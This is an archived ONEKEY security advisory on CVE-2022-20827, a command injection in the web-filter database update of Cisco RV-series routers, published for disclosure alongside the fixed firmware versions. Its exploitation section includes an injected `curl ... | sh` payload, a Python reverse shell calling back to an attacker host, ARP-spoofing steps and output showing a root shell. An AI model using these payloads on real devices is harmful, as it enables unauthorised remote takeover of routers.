---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-09_advisory-cisco-small-business-rv-series-routers-web-filter-database-update-comma.md
original_filename: 2022-08-09_advisory-cisco-small-business-rv-series-routers-web-filter-database-update-comma.md
title: 'Advisory: Cisco Small Business RV Series Routers Web Filter Database Update
  Command Injection Vulnerability'
category: documents
detected_topics:
- command-injection
- supply-chain
- api-security
tags:
- imported
- documents
- command-injection
- supply-chain
- api-security
language: en
raw_sha256: e63fa2c0dd7ad608fabde189c52ee74a2c65253714b87bec47ef50c9632a0d86
text_sha256: 60a5164fda44ce096051494bce55fb8e172afbce0273f8fa78b268d4dcdb169f
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# Advisory: Cisco Small Business RV Series Routers Web Filter Database Update Command Injection Vulnerability

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-09_advisory-cisco-small-business-rv-series-routers-web-filter-database-update-comma.md
- Source Type: markdown
- Detected Topics: command-injection, supply-chain, api-security
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `e63fa2c0dd7ad608fabde189c52ee74a2c65253714b87bec47ef50c9632a0d86`
- Text SHA256: `60a5164fda44ce096051494bce55fb8e172afbce0273f8fa78b268d4dcdb169f`


## Content

---
title: "Advisory: Cisco Small Business RV Series Routers Web Filter Database Update Command Injection Vulnerability"
page_title: "Advisory: Cisco Small Business RV Series Routers Web Filter Database Update Command Injection Vulnerability | ONEKEY Research | Research | ONEKEY"
url: "https://onekey.com/blog/advisory-cisco-small-business-rv-series-routers-web-filter-database-update-command-injection-vulnerability/"
final_url: "https://www.onekey.com/resource/advisory-cisco-small-business-rv-series-routers-web-filter-database-update-command-injection-vulnerability"
authors: ["Quentin Kaiser (@QKaiser)"]
programs: ["Cisco"]
bugs: ["OS command injection", "RCE"]
publication_date: "2022-08-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2349
---

[Resources](/resources)

>

[Research](/resources/research)

>

Advisory: Cisco Small Business RV Series Routers Web Filter Database Update Command Injection Vulnerability

# Advisory: Cisco Small Business RV Series Routers Web Filter Database Update Command Injection Vulnerability

![Advisory: Cisco Small Business RV Series Routers Web Filter Database Update Command Injection Vulnerability](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b822d403bdc2f3221d4d5_6712ae4ad3b27687291e4622_05.avif)

![](https://cdn.prod.website-files.com/plugins/Basic/assets/placeholder.60f9b1840c.svg)

August 8, 2022

5

min read

TablE of contents

Example H2

## READY TO UPGRADE YOUR RISK MANAGEMENT?

Make cybersecurity and compliance efficient and effective with ONEKEY.

[See it in Action](/book-a-demo)

Not all bugs are created equal. This advisory describes a vulnerability we identified when hunting for bugs to craft exploit chains for PWN2OWN 2021. Sadly, the vulnerable path is only reachable once a day so it did not match the PWN2OWN rules :(

The vulnerability would allow patient and suitably positioned attackers to obtain unauthenticated remote command execution on affected devices. 

**Affected vendor & product**| Cisco RV160 and RV260 Series Routers  
Cisco RV340 and RV345 Series Routers  
---|---  
**Vendor Advisory**| <https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sb-mult-vuln-CbVp4SUR>  
**Vulnerable version**|  RV160 and RV260 Series Routers version 1.0.01.05 to 1.0.01.08 included  
RV340 and RV345 Series Routers version 1.0.03.26 to 1.0.03.27 included  
**Fixed version**|  RV160 and RV260 Series Routers version 1.0.01.09  
RV340 and RV345 Series Routers version 1.0.03.28  
**CVE IDs**| [CVE-2022-20827](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-20827)  
**Impact**|  8.8 (CVSS 3.1:[AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](http://nvd.nist.gov/cvss.cfm?calculator&version=3.0&vector=\(AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H))  
**Credit**|  Q. Kaiser, ONEKEY Research Lab  
  
## Summary

On boot if a specific file is not present and then once a day regardless of that condition, the `wfapp` binary (WebFilter App) checks if a new reputation database is available from brightcloud services.

The first request is this one:
  
  
  POST / HTTP/1.1
  Content-Type: text/html
  Host: bcap15.brightcloud.com
  Content-Length: 296
  Connection: close
  
  <?BrightCloud version=bcap/1.1?>
  <bcap>
  <seqnum>1</seqnum>
  <encrypt-type>none</encrypt-type>
  <request>
  <method>getmd5update1mrep</method>
  <uid>PSZ25281CDE</uid>
  <productid>RV340-WB</productid>
  <oemid>Cisco</oemid>
  <md5currentmajor>0</md5currentmajor>
  <md5currentminor>0</md5currentminor>
  </request>
  </bcap>
  
  
  HTTP/1.1 200 OK
  Content-Type: application/xml
  Date: Fri, 01 Oct 2021 14:00:39 GMT
  Server: Kestrel
  Content-Length: 425
  Connection: Close
  
  <?BrightCloud version=bcap/1.1?>
  <bcap>
  <seqnum>1</seqnum>
  <status>200</status>
  <statusmsg>OK</statusmsg>
  <response>
  <status>200</status>
  <statusmsg>OK</statusmsg>
  <filename>full_bcdb_rep_1m_7.888.bin</filename>
  <checksum>2381a9b7ea1ce3bd0c71c41891507233</checksum>
  <updateMajorVersion>7</updateMajorVersion>
  <updateMinorVersion>888</updateMinorVersion>
  <targetchecksum>2381a9b7ea1ce3bd0c71c41891507233</targetchecksum>
  </response>
  </bcap>

Then, the binary tries to fetch the database from another server:
  
  
  GET /full_bcdb_rep_1m_7.888.bin?uid=PSZ25281CDE&deviceid=RV340-WB&oemid=Cisco HTTP/1.1
  Host: database.brightcloud.com
  Connection: close

If the database is of the right format and matches the returned checksum and targetchecksum in the first response, the function at offset `0x000157fc` is called. This function is not identified as such by Ghidra due to some call indirection.

This function executes a command like the following:
  
  
  char cmd_buf [128];
  sprintf(cmd_buf,"rm %s%s; cp %s %s; rm /tmp/%s","/mnt/webrootdb/","full_bcdb_rep_1m*", DAT_00088b58,"/mnt/webrootdb/","full_bcdb_rep_1m*");
  __stream = popen(cmd_buf,"r");

`DAT_00088b58` contains the `filename` value from the first response. We therefore have two potential ways of exploitation:

  1. a stack buffer overflow due to the insecure call to sprintf
  2. an arbitrary command injection

We went the command injection way, but we could have gone for the stack overflow as well. Except for non-executable stack, the binary was not built with compile time mitigations, as shown in ONEKEY's ELF overview:

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b8bc145ab4757fb3f91e1_image-2-1024x801.png)

## Exploitation Strategy

The first thing is to return our injection payload in the first response within the parameter `filename`:
  
  
  HTTP/1.0 200 OK
  Server: BaseHTTP/0.6 Python/3.8.10
  Date: Wed, 13 Oct 2021 15:33:31 GMT
  Content-Type: application/xml
  Content-Length: 453
  
  <?BrightCloud version=bcap/1.1?>
  <bcap>
  <seqnum>1</seqnum>
  <status>200</status>
  <statusmsg>OK</statusmsg>
  <response>
  <status>200</status>
  <statusmsg>OK</statusmsg>
  <filename>full_bcdb_rep_1m_7.888`curl${IFS}192.168.200.1|sh`.bin</filename>
  <checksum>7a09b495126b3f4ae4c11cc91a19fdf2</checksum>
  <updateMajorVersion>7</updateMajorVersion>
  <updateMinorVersion>888</updateMinorVersion>
  <targetchecksum>7a09b495126b3f4ae4c11cc91a19fdf2</targetchecksum>
  </response>
  </bcap>

The `wfapp` client will then request the file from our malicious server, we answer with a valid WebFilter database file.

Once the file is downloaded and its checksum validated, the client will execute our arbitrary command:

This command requests a shell script from our malicious server and pipes it to `sh`. Our shell script is simply this:
  
  
  curl -i http://192.168.200.1:8081 
  HTTP/1.0 200 OK
  Server: BaseHTTP/0.6 Python/3.8.10
  Date: Wed, 13 Oct 2021 15:37:27 GMT
  
  #!/bin/sh
  export RHOST="192.168.200.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

There are two ways to exploit the device: either during the device boot sequence (option 1), or during the daily call performed by wfapp (option 2).

To force the binary to immediately take the vulnerable code path on boot, files must be absent from `/mnt/webrootdb`. We therefore recommend you to execute a factory reset before running the on boot exploit. This way you don't have to wait for 24 hours for the vulnerable code path to be taken.

To exploit the device on boot, the idea is to launch an ARP spoofing attack against the entire subnet and setup IP forwarding along with an iptable rule to redirect HTTP traffic to our malicious server.

This is what executing the exploit should look like:
  
  
  python3 cisco_rv340_wan_boot_rce.py 192.168.1.50 4242
  [+] Trying to bind to 192.168.1.50 on port 4242: Done
  [+] Waiting for connections on 192.168.1.50:4242: Got connection from 192.168.1.45 on port 52012
  [+] client requested brightcloud update
  [+] client requested WebFilter database
  [+] command injection successful. Sending reverse shell payload.
  [*] Switching to interactive mode
  /bin/sh: can't access tty; job control turned off
  
  
  BusyBox v1.23.2 (2021-06-14 02:21:16 IST) built-in shell (ash)
  
  / # $ id
  uid=0(root) gid=0(root)

## The Fix

Cisco fixed the issue by enforcing certificate validation. Our assumption is based on this piece of code where they setup a trusted list of authorities:

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b8bc145ab4757fb3f91c4_image.png)

This was confirmed locally with [qsslcaudit](https://github.com/gremwell/qsslcaudit), which indicated that the device no longer connects to untrusted servers.

Sadly, this fix will not protect against supply chain attacks. If attackers were to compromise database.brightcloud.com, they would still be able to exploit either the command injection or the stack overflow through sprintf, which are still present:

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/671b8bc145ab4757fb3f91c1_image-1.png)

## Key Takeaways

It's always interesting when security features end up inserting security vulnerabilities. In this case, the insertion of BrightCloud web filtering feature in version 1.0.03.26 opened up the device for remote exploitation. Note that it's not the first vulnerability affecting BrightCloud, Talos reported a [heap buffer overflow](https://talosintelligence.com/vulnerability_reports/TALOS-2018-0683) back in 2018 affecting the BrightCloud HTTP client.

While we could not exploit this flaw during PWN2OWN 2021 due to the contest rules, we know real world attackers can be patient and won't hesitate to wait on you. So patch your routers !

Speaking of PWN2OWN, the 2021 edition was probably the last time the Cisco RV340 made an appearance given that its end of security/vulnerability support is [scheduled for October 28, 2022](https://www.cisco.com/c/en/us/products/collateral/routers/small-business-rv-series-routers/small-business-rv340-rv345-series-eol.html). This also marks the end of the overall "RV Small Business Router" line, so we're really curious to see what ZDI will choose as a replacement target !

Personally, I'm convinced that this router series will be affected by forever days before the end of 2022. [Just](https://b1eyc.myrdbx.io/blog/advisory-cisco-rv340-dual-wan-gigabit-vpn-router-rce-over-lan/) [take](https://b1eyc.myrdbx.io/blog/advisory-cisco-rv34x-series-privilege-escalation-vpntimer/) [our word for it](https://b1eyc.myrdbx.io/blog/advisory-cisco-rv34x-authentication-bypass-remote-command-execution/).

## Timeline

  * **2022-04-13** \- Report accepted by ZDI
  * **2022-08-04** \- Advisory published by Cisco
  * **2022-08-09** \- Publication of ONEKEY's advisory

Share

## About Onekey

[ONEKEY](/) is the leading European specialist in Product Cybersecurity & Compliance Management and part of the investment portfolio of [PricewaterhouseCoopers Germany (PwC)](https://www.pwc.de/de.html). The unique combination of the automated ONEKEY Product Cybersecurity & Compliance Platform (OCP) with expert knowledge and consulting services provides fast and comprehensive analysis, support, and management to improve product cybersecurity and compliance from product purchasing, design, development, production to end-of-life.

![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0cd/68d39e055d1135bee5f4ee28_foto_website_careers.webp)

CONTACT:  
Sara Fortmann  
Senior Marketing Manager  
[sara.fortmann@onekey.com](mailto:sara.fortmann@onekey.com)

euromarcom public relations GmbH  
[team@euromarcom.de](mailto:team@euromarcom.de)

## RELATED RESEARCH ARTICLES

![Latest Developments in Unblob: New Formats, Smarter Extraction, and a More Hardened Release Pipeline](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/69c51b643603964355fec609_2026-03-26-ONEKEY-Unblob-Dev.-Update_Banner.png)

Research

Mar 26, 2026

10

min read

### Latest Developments in Unblob: New Formats, Smarter Extraction, and a More Hardened Release Pipeline

Discover what changed in unblob since release 25.11.25, including new firmware and filesystem format support, smarter extraction workflows, robustness fixes, performance improvements, and stronger release security.

[Read More![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0cd/67ee4d7596311684a7a1a95a_xynrqysiccm914h50n.svg)](/resource/latest-developments-in-unblob-new-formats-smarter-extraction-and-a-more-hardened-release-pipeline)

[](/resource/latest-developments-in-unblob-new-formats-smarter-extraction-and-a-more-hardened-release-pipeline)

![How We Taught Our Platform to Understand RTOS Firmware](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/68d14bca3bf9570f12d3d2ab_HERO-RTOS-research-ONEKEY.jpg)

Research

Sep 22, 2025

15

min read

### How We Taught Our Platform to Understand RTOS Firmware

Discover how ONEKEY’s platform breaks open real-time operating system (RTOS) firmware. Learn how automated architecture detection, load address recovery, and component identification bring transparency and security to embedded devices in automotive, medical, and industrial sectors.

[Read More![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0cd/67ee4d7596311684a7a1a95a_xynrqysiccm914h50n.svg)](/resource/how-we-taught-our-platform-to-understand-rtos-firmware)

[](/resource/how-we-taught-our-platform-to-understand-rtos-firmware)

![Security Advisory: Remote Code Execution on Diviotec IP Camera \(CVE-2025-5113\)](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0d8/683d4ad4919020daef44c5cf_Remote-Code-Execution-on-Diviotec-IP-Camera.jpg)

Research

Jun 3, 2025

10

min read

### Security Advisory: Remote Code Execution on Diviotec IP Camera (CVE-2025-5113)

Explore ONEKEY Research Lab's security advisory detailing a critical vulnerability in Diviotec IP Cameras. Learn about the risks and recommended actions.

[Read More![](https://cdn.prod.website-files.com/66e0617dd66a9d24cea2d0cd/67ee4d7596311684a7a1a95a_xynrqysiccm914h50n.svg)](/resource/security-advisory-remote-code-execution-on-diviotec-ip-camera-cve-2025-5113)

[](/resource/security-advisory-remote-code-execution-on-diviotec-ip-camera-cve-2025-5113)

## Ready to automate your Product Cybersecurity & Compliance?

Make cybersecurity and compliance efficient and effective with ONEKEY.

[See it in Action](/book-a-demo)
